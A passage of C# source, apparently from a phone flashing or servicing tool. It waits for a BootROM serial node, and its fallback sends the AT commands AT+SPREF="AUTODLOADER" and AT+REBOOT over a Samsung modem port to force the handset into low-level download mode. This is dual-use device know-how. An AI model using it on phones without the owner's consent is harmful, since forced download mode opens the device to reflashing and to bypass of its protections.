                        if (UsbIds.IsBrom(p) && Proto.ProbeAlive(p))
                            return p;
                    }
                    catch { }
                }

                if ((DateTime.UtcNow - lastNote).TotalSeconds >= 10)
                {
                    lastNote = DateTime.UtcNow;
                    log.LogDebug("Still waiting for the BROM node (1782:4D00)...");
                }
                Thread.Sleep(700);
            }
            return null;
        }

        /// <summary>Android fallback: arm the autoloader flag over the Samsung modem.</summary>
        static bool AtKick(ILogSink log)
        {
            string modem = null;
            foreach (string p in SerialPort.GetPortNames().Distinct())
            {
                if (UsbIds.VidPidOf(p).StartsWith("04E8:", StringComparison.OrdinalIgnoreCase))
                {
                    modem = p;
                    break;
                }
            }

            if (modem == null)
            {
                foreach (string p in SerialPort.GetPortNames().Distinct())
                {
                    try { if (Proto.IsAtModem(p)) { modem = p; break; } } catch { }
                }
            }

            if (modem == null)
            {
                log.LogWarning("No AT modem port found for the autoloader kick.");
                return false;
            }

            try
            {
                log.LogInfo($"Arming autoloader on {modem} and rebooting...");
                using var sp = Proto.Open(modem, Proto.MODEM_BAUD, 1500);
                try
                {
                    sp.DtrEnable = false;
                    Thread.Sleep(200);
                    sp.DtrEnable = true;
                    sp.RtsEnable = true;
                }
                catch { }

                sp.DiscardInBuffer();
                sp.Write("AT+SPREF=\"AUTODLOADER\"\r");
                Thread.Sleep(400);
                sp.Write("AT+REBOOT\r");
                sp.BaseStream.Flush();
                Thread.Sleep(400);
                return true;
            }
            catch (Exception ex)
            {
                log.LogWarning($"AT autoloader kick failed: {ex.Message}");
                return false;
            }
        }

        static void Sleep(int ms, CancellationToken token)
        {
            if (ms <= 0) return;
            if (token.WaitHandle.WaitOne(ms))
                token.ThrowIfCancellationRequested();
        }
    }
}
